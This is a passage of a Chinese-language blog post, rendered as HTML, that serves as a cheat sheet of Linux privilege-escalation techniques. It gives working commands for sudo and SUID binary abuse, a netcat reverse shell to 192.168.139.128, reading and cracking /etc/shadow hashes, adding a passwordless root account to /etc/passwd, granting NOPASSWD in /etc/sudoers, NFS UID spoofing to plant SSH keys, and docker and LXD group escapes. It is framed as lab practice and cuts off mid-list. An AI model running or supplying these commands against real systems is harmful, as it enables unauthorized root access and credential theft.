+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>
+
+<p>通过awk提权</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br></pre></td></tr></table></figure>
+
+<p>通过find提权</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure>
+
+<p>还有很多命令可以通过查上面的手册<br><img src="/2020/06/23/linux-tiquan/1592833753662.png" alt="1592833753662"></p>
+<p><img src="/2020/06/23/linux-tiquan/1592833818823.png" alt="1592833818823"></p>
+<p><img src="/2020/06/23/linux-tiquan/1592833852803.png" alt="1592833852803"></p>
+<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid"></a>什么是suid</h2><p>SUID是uid +s的组合，s指的是特殊权限。一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root的权限，就会配置特殊权限。  </p>
+<p>例如passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制。</p>
+<p><img src="/2020/06/23/linux-tiquan/1592880197935.png" alt="1592880197935">  </p>
+<h2 id="suid提权原理"><a href="#suid提权原理" class="headerlink" title="suid提权原理"></a>suid提权原理</h2><p>SUID代表“执⾏时设置⽤⼾ID”，具有该标志位的⽂件在执⾏时，运 ⾏的uid变为属主⾝份，也就是说，如果⼀个程序属主是root，并具有suid标志位，其他⽤⼾运⾏时uid会临时变为root。 </p>
+<h2 id="提权演示-1"><a href="#提权演示-1" class="headerlink" title="提权演示"></a>提权演示</h2><p><strong>常⻅的⽤于SUID提权的程序：</strong></p>
+<ol>
+<li><p>Nmap：较旧版本的Nmap（2.02⾄5.21）带有交互模式，从⽽允许⽤⼾执⾏shell命令。</p>
+<blockquote>
+<p> <code>nmap --interactive ， nmap&gt; !sh</code> 。 </p>
+</blockquote>
+</li>
+<li><p>find： <code>touch test</code></p>
+<blockquote>
+<p><code>find test -exec whoami \</code>; </p>
+<p><code>find test -exec bash -p \</code>; </p>
+<p><code>find test -exec /bin/sh \</code>; （DC1就遇到bash⽆法提权，但是sh可以提权的情况） </p>
+<p><code>find test -exec nc -e /bin/sh 192.168.139.128 9999 \</code>; </p>
+</blockquote>
+</li>
+<li><p>vim： 直接编辑⽂件 vim /etc/shadow ，或者进⼊vim后启动sh交互。</p>
+<blockquote>
+<p><code>:set shell=/bin/sh</code></p>
+<p><code>:shell</code></p>
+<p>或者：<code>vim -c &#39;!sh&#39;</code></p>
+</blockquote>
+</li>
+<li><p>bash： <code>bash -p</code></p>
+</li>
+<li><p>利⽤less执⾏命令</p>
+<blockquote>
+<p><code>less /etc/passwd</code></p>
+<p><code>!/bin/sh</code> （已经设置suid的sh）</p>
+<p>（more也 可以） </p>
+</blockquote>
+</li>
+</ol>
+<p>更多请参考：<a href="https://gtfobins.github.io/#+suid" target="_blank" rel="noopener">https://gtfobins.github.io/#+suid</a></p>
+<p><strong>查看具有 suid权限的命令</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm <span class="number">-4000</span> -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / -user root -perm <span class="number">-4000</span> -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find / -perm <span class="number">-4000</span> -type f -exec ls -la &#123;&#125; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span> \;</span><br><span class="line">find / -uid <span class="number">0</span> -perm <span class="number">-4000</span> -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592881118095.png" alt="1592881118095"></p>
+<p>env和xxd等都可以使用suid提权<br><strong>env：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">'cp $(which env) .; chmod +s ./env'</span></span><br><span class="line"></span><br><span class="line">./env /bin/sh -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592881595036.png" alt="1592881595036"></p>
+<p><strong>xxd：</strong></p>
+<p>xxd的作用是将一个文件以16进制的形式显示出来。他被配置了特殊权限，并且用户组为itservices是拥有执行权限x的。通过<code>cat /etc/group | grep itservices</code>命令得到susan属于这个用户组</p>
+<p><img src="/2020/06/23/linux-tiquan/1592881960486.png" alt="1592881960486"></p>
+<p>一旦suid和执行权限在一起就可能导致权限提升！</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">'cp $(which xxd) .; chmod +s ./xxd'</span></span><br><span class="line"></span><br><span class="line">LFILE=file_to_read</span><br><span class="line">./xxd <span class="string">"$LFILE"</span> | xxd -r</span><br></pre></td></tr></table></figure>
+
+<p>可以用该命令来查看/etc/shadow</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su susan</span><br><span class="line"></span><br><span class="line">LFILE=/etc/shadow</span><br><span class="line">xxd <span class="string">"$LFILE"</span> | xxd -r</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592882175074.png" alt="1592882175074"></p>
+<h1 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h1><h2 id="收集密码相关信息"><a href="#收集密码相关信息" class="headerlink" title="收集密码相关信息"></a>收集密码相关信息</h2><p>1.查找包含密码得文件(关键字password)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep --color=auto -rnw <span class="string">'/'</span> -ie <span class="string">"PASSWORD"</span> --color=always <span class="number">2</span>&gt; /dev/<span class="keyword">null</span></span><br><span class="line">find . -type f -exec grep -i -I <span class="string">"PASSWORD"</span> &#123;&#125; /dev/<span class="keyword">null</span> \;</span><br></pre></td></tr></table></figure>
+
+<p>2.查看过期的密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pam_cracklib会保存过期的密码记录在 /etc/security/opasswd ⽂件中。</span><br></pre></td></tr></table></figure>
+
+<p>3.查看用户最后编辑得文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -mmin <span class="number">-10</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span> | grep -Ev <span class="string">"^/proc"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#最近⼗分钟编辑的⽂件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592662561046.png" alt="1592662561046"></p>
+<p>4.查看内存中的密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br></pre></td></tr></table></figure>
+
+<p>5.查看敏感文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate password | more</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592662724337.png" alt="1592662724337"></p>
+<h2 id="破解-etc-passwd哈希"><a href="#破解-etc-passwd哈希" class="headerlink" title="破解/etc/passwd哈希"></a>破解/etc/passwd哈希</h2><p>linux的用户密码哈希存储在/etc/shadow文件，普通用户能够查看到的则是/etc/passwd这个文件  在/etc/passwd中，比如：<code>root:x:0:0:root:/root:/bin/bash</code>。账户的第二列是密码哈希，如果该列为x则代表密码哈希存储在/etc/shadow文件上</p>
+<h2 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h2><p>只有root用户权限能够查看  保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号:分为九个部分</p>
+<ol>
+<li>用户名</li>
+<li>加密后的密码</li>
+<li>上次修改密码的时间(从1970.1.1开始的总天数)</li>
+<li>两次修改密码间隔的最少天数，如果为0，则没有限制</li>
+<li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为9999则没有限制</li>
+<li>提前多少天警告用户密码将过期</li>
+<li>在密码过期之后多少天禁用此用户</li>
+<li>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</li>
+<li>保留</li>
+</ol>
+<p><img src="/2020/06/23/linux-tiquan/1592835598272.png" alt="1592835598272"></p>
+<p>并且哈希加密的密码具有固定格式：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id$<span class="pgsql">salt$<span class="keyword">encrypted</span></span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512</p>
+</li>
+<li><p>salt为盐值,系统随机生成</p>
+</li>
+<li><p>encrypted表示密码的hash值</p>
+</li>
+</ul>
+<h1 id="利用可写入文件"><a href="#利用可写入文件" class="headerlink" title="利用可写入文件"></a>利用可写入文件</h1><h2 id="搜索可写入文件"><a href="#搜索可写入文件" class="headerlink" title="搜索可写入文件"></a>搜索可写入文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -writable ! -user \`whoami\` -type f ! -path <span class="string">"/proc/*"</span> ! -path <span class="string">"/sys/*"</span> -exec ls -al &#123;&#125; \; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / -perm <span class="number">-2</span> -type f <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br><span class="line">find / ! -path <span class="string">"*/proc/*"</span> -perm <span class="number">-2</span> -type f -<span class="keyword">print</span> <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="etc-passwd-文件写入"><a href="#etc-passwd-文件写入" class="headerlink" title="/etc/passwd 文件写入"></a>/etc/passwd 文件写入</h2><p><strong>/etc/passwd</strong></p>
+<p>普通用户权限能够查看  保存用户信息，每一行代表一个用户，每一行通过冒号:分为七个部分  </p>
+<ol>
+<li>用户名 </li>
+<li>密码，x表示密码保存在/etc/shadow </li>
+<li>UID，0代表root </li>
+<li>GID，表示所在组 </li>
+<li>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other </li>
+<li>用户主目录 </li>
+<li>默认shell类型</li>
+</ol>
+<p><img src="/2020/06/23/linux-tiquan/1592834918819.png" alt="1592834918819"></p>
+<p>当我们对/etc/passwd文件具有写入权限时，可以尝试在/etc/passwd文件下添加新的用户使这个用户具有root权限</p>
+<p><strong>生成密码字符串的三种方式：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt 盐值 密码</span><br><span class="line">mkpasswd -m SHA<span class="number">-512</span> 密码</span><br><span class="line">python2 -c <span class="string">'import crypt; print crypt.crypt("密码", "$6$salt")'</span></span><br></pre></td></tr></table></figure>
+
+<p>kali使用openssl工具先创建一个本地的加密用户：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd <span class="number">-1</span> -salt admin <span class="number">111111</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592836118929.png" alt="1592836118929"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#之后构造：</span></span><br><span class="line">admin123:$<span class="number">1</span>$admin$<span class="number">2</span>WRLhTGcIMgZ7OhwCpREK1:<span class="number">0</span>:<span class="number">0</span>::/root:/bin/bash</span><br><span class="line"><span class="comment">#将其写入/etc/passwd</span></span><br><span class="line"><span class="comment">#通过su admin123  密码 111111切换用户即可获得root权限</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>不生成密码的方式：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'dummy::0:0::/root:/bin/bash'</span> &gt;&gt;/etc/passwd</span><br><span class="line">su - dummy</span><br></pre></td></tr></table></figure>
+
+<h2 id="etc-sudoers文件写入"><a href="#etc-sudoers文件写入" class="headerlink" title="/etc/sudoers文件写入"></a>/etc/sudoers文件写入</h2><p>当使用sudo命令需要密码并且在不知道密码的情况下，如果该用户对/etc/sudoers文件具有写入权限，则可以通过写/etc/sudoers文件来使得我们不需要密码便能使用sudo命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"用户名 ALL=(ALL:ALL) ALL"</span>&gt;&gt;/etc/sudoers</span><br><span class="line"><span class="comment"># use SUDO without password</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名 ALL=(ALL) NOPASSWD: ALL"</span> &gt;&gt;/etc/sudoers</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名 ALL=NOPASSWD: /bin/bash"</span> &gt;&gt;/etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592840613216.png" alt="1592840613216"></p>
+<p><img src="/2020/06/23/linux-tiquan/1592840705377.png" alt="1592840705377"></p>
+<h2 id="提权演示-2"><a href="#提权演示-2" class="headerlink" title="提权演示"></a>提权演示</h2><p><strong>破解哈希值：</strong></p>
+<p>先查看/etc/passwd文件</p>
+<p><img src="/2020/06/23/linux-tiquan/1592836209506.png" alt="1592836209506"></p>
+<p>得到insecurity用户的md5值，使用在线破解得到<code>P@ssw0rd!</code>登录即可得到root权限</p>
+<p><img src="/2020/06/23/linux-tiquan/1592836496817.png" alt="1592836496817"></p>
+<p>破解用户密码hash的常用工具和方法 </p>
+<ul>
+<li><p>在线网站查询 </p>
+<p><a href="https://cmd5.com" target="_blank" rel="noopener">https://cmd5.com</a> </p>
+<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a>  </p>
+</li>
+<li><p>工具 </p>
+<p>John the Ripper 和 hashcat  </p>
+<p>Kali2.0集成了John the Ripper和hashcat  </p>
+<p><a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-john/</a>  </p>
+<p><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a>  </p>
+<p>mimipenguin  </p>
+<p><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a>  </p>
+<p>原理类似于mimikatz，通过内存导出明文密码</p>
+<p><strong>写入用户和密码：</strong></p>
+<p>参考下面几个靶机的提权</p>
+<ol>
+<li>对/etc/passwd文件具有写入权限：<a href="http://cyzcc.vip/2020/03/20/AI-Web1/">http://cyzcc.vip/2020/03/20/AI-Web1/</a></li>
+<li>teehee具有root权限，通过teehee写入：<a href="http://cyzcc.vip/2020/03/07/vulnhub-DC9/">http://cyzcc.vip/2020/03/07/vulnhub-DC9/</a></li>
+<li>wget具有root权限，通过wget写入：<a href="http://cyzcc.vip/2020/06/06/Os-hackNos-1/">http://cyzcc.vip/2020/06/06/Os-hackNos-1/</a></li>
+</ol>
+<p>。。。。。。</p>
+</li>
+</ul>
+<h1 id="利用隐藏文件"><a href="#利用隐藏文件" class="headerlink" title="利用隐藏文件"></a>利用隐藏文件</h1><p>有时候隐藏文件会存放一些重要的信息，比如搜索home目录下的所有隐藏文件，并用ls -al显示出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">".*"</span> -type f -path <span class="string">"/home/*"</span> -exec ls -al &#123;&#125; \; <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592879116735.png" alt="1592879116735"></p>
+<p>再倒数第二个文件发现可疑点，查看发现是susan的密码<br><img src="/2020/06/23/linux-tiquan/1592879290449.png" alt="1592879290449"></p>
+<h1 id="NFS低权限访问"><a href="#NFS低权限访问" class="headerlink" title="NFS低权限访问"></a>NFS低权限访问</h1><h2 id="NFS简介"><a href="#NFS简介" class="headerlink" title="NFS简介"></a>NFS简介</h2><p>NFS(Network File System)即网络文件系统，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。</p>
+<p><strong>NFS的配置⽂件：</strong></p>
+<blockquote>
+<p><code>/etc/exports</code> </p>
+</blockquote>
+<p>如果<code>no_root_squash</code>出现在配置⽂件中的话，如果⽬录分享者是root，那么对于远程挂载⽤⼾来说，他也具有了该⽬录下root的权限。 </p>
+<p><strong>常见操作：</strong></p>
+<ul>
+<li><p>查看远程主机共享的⽂件夹：<code>showmount -e 10.10.10.10</code></p>
+</li>
+<li><p>建⽴⽬录、挂载远程主机共享⽂件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/nfsdir  </span><br><span class="line">mount -t nfs <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>:/shared /tmp/nfsdir    </span><br><span class="line">cd /tmp/nfsdir</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>恶意利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># copy wanted shell</span></span><br><span class="line">cp /bin/bash . </span><br><span class="line"><span class="comment"># set suid permission</span></span><br><span class="line">chmod +s bash</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="靶机演示"><a href="#靶机演示" class="headerlink" title="靶机演示"></a>靶机演示</h2><p>通过nmap扫描到靶机开放了2049服务，该端口对应nfs服务<br><img src="/2020/06/23/linux-tiquan/1592897611985.png" alt="1592897611985"></p>
+<p> 安装nfs客户端工具</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br></pre></td></tr></table></figure>
+
+<p>安装完成之后，使用showmount命令检索给定主机的导出文件夹列表。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e <span class="number">192.168</span><span class="number">.211</span><span class="number">.161</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592898274698.png" alt="1592898274698"></p>
+<p>账号peter的home目录可以被挂载</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/peter</span><br><span class="line">mount <span class="number">192.168</span><span class="number">.211</span><span class="number">.161</span>:/home/peter /mnt/peter</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592898522337.png" alt="1592898522337"></p>
+<p>其中挂载好的peter目录显示的文件的所有者和所属组分别为1001和1005</p>
+<p>当在/mnt/peter目录创建目录的时候提示权限不够<br><img src="/2020/06/23/linux-tiquan/1592898726491.png" alt="1592898726491"></p>
+<p>即使在kali攻击机上是root用户，但是还没有写入权限，因为默认情况下客户端的root身份会被主动压缩成匿名者</p>
+<p>可以伪造文件所有者的UID和GID来欺骗NFS服务器，创建一个gid为1005的用户组，接着创建peter这个账户uid指定为1001，gid指定为1005。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd -g <span class="number">1005</span> peter</span><br><span class="line">adduser peter -uid <span class="number">1001</span> -gid <span class="number">1005</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592898980254.png" alt="1592898980254">  </p>
+<p>现在/mnt/peter下文件的所有者更换为peter，但现在还是以客户端的root登陆，服务端默认为匿名者<br><img src="/2020/06/23/linux-tiquan/1592899077861.png" alt="1592899077861"></p>
+<p>切换到peter用户，服务端便会认为是存在的一个用户peter，并且可以创建文件</p>
+<p><img src="/2020/06/23/linux-tiquan/1592899203987.png" alt="1592899203987"></p>
+<p>能创建文件之后就可以写入ssh公钥文件(先使用ssh-keygen生成公私钥对)</p>
+<p><img src="/2020/06/23/linux-tiquan/1592902461569.png" alt="1592902461569"></p>
+<p>首先在/mnt/peter创建服务器上的.ssh目录，写入公钥，再通过私钥登陆</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir .ssh</span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt; /mnt/peter/.ssh/authorized_keys</span><br><span class="line">ssh peter@<span class="number">192.168</span><span class="number">.211</span><span class="number">.161</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592902516686.png" alt="1592902516686"></p>
+<h1 id="利用docker组提权"><a href="#利用docker组提权" class="headerlink" title="利用docker组提权"></a>利用docker组提权</h1><p>通过groups命令得到peter用户也属于docker组<br><img src="/2020/06/23/linux-tiquan/1592903090831.png" alt="1592903090831"></p>
+<p>当一个用户是’docker’组的成员时，运行以下命令将会得到一个root shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过拉取镜像的方式来获得一个shell</span></span><br><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利⽤DockerSocket提权办法</span></span><br><span class="line">sudo docker -H unix:<span class="comment">///google/host/var/run/docker.sock run -v /:/host -it</span></span><br><span class="line">ubuntu chroot /host /bin/bash</span><br><span class="line">sudo docker -H unix:<span class="comment">///google/host/var/run/docker.sock run -it --privileged --</span></span><br><span class="line">pid=host debian nsenter -t <span class="number">1</span> -m -u -n -i sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/23/linux-tiquan/1592903198145.png" alt="1592903198145"></p>
+<p>参考：<a href="https://fosterelli.co/privilege-escalation-via-docker.html" target="_blank" rel="noopener">https://fosterelli.co/privilege-escalation-via-docker.html</a></p>
+<h1 id="利用LXC-LXD-组提权"><a href="#利用LXC-LXD-组提权" class="headerlink" title="利用LXC/LXD 组提权"></a>利用LXC/LXD 组提权</h1><p><strong>利用条件：</strong></p>
+<p>查看⽤⼾信息的时候，⽤⼾存在在组 lxc 或者 lxd 中 </p>
+<p><strong>利用方法：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kali里面执行：</span></span><br><span class="line"><span class="comment"># build a simple alpine image</span></span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/saghul/lxd-alpine-builder</span></span><br><span class="line">./build-alpine -a i686</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#靶机中执行：</span></span><br><span class="line"><span class="comment"># import the image</span></span><br><span class="line">lxc image import ./alpine.tar.gz --alias myimage</span><br><span class="line"><span class="comment"># run the image</span></span><br><span class="line">lxc init myimage mycontainer -c security.privileged=<span class="keyword">true</span></span><br><span class="line"><span class="comment"># mount the /root into the image</span></span><br><span class="line">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root</span><br><span class="line">recursive=<span class="keyword">true</span></span><br><span class="line"><span class="comment"># interact with the container</span></span><br><span class="line">lxc start mycontainer</span><br><span class="line">lxc exec mycontainer /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机执⾏ </p>
+<p>参考：<a href="https://freehk.top/2019/12/10/linux-lxd%E6%8F%90%E6%9D%83/" target="_blank" rel="noopener">https://freehk.top/2019/12/10/linux-lxd%E6%8F%90%E6%9D%83/</a></p>
+<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录</p>
+<h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a><strong>Cron</strong></h2><p><strong>crontab文件格式：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本格式 :</span><br><span class="line"> *　　*　　*　　*　　*　　command</span><br><span class="line"> 分　 时　 日　 月　 周　 命令</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第1列表示分钟1～59 每分钟用*或者 */1表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line"><span class="number">30</span> <span class="number">21</span> * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每晚的<span class="number">21</span>:<span class="number">30</span>重启apache。</span><br><span class="line"></span><br><span class="line"><span class="number">45</span> <span class="number">4</span> <span class="number">1</span>,<span class="number">10</span>,<span class="number">22</span> * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每月<span class="number">1</span>、<span class="number">10</span>、<span class="number">22</span>日的<span class="number">4</span> : <span class="number">45</span>重启apache。</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> <span class="number">1</span> * * <span class="number">6</span>,<span class="number">0</span> /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每周六、周日的<span class="number">1</span> : <span class="number">10</span>重启apache。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>检查系统中存在的cron计划任务，看看是否有权限访问和修改 </p>
+</li>
+<li><p>检查⽂件内容，看看有没有可以提权的途径 </p>
+</li>
+<li><p>利⽤pspy⼯具，检查命令和⽂件系统事件 ./pspy64 -pf -i 1000 </p>
+</li>
+</ul>
+<p>一些敏感的目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d</span><br><span class="line">/etc/cron*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.d</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/cron.daily</span><br><span class="line">/etc/cron.hourly</span><br><span class="line">/etc/cron.monthly</span><br><span class="line">/etc/cron.weekly</span><br><span class="line">/etc/sudoers</span><br><span class="line">/etc/exports</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/<span class="keyword">var</span>/spool/cron</span><br><span class="line">/<span 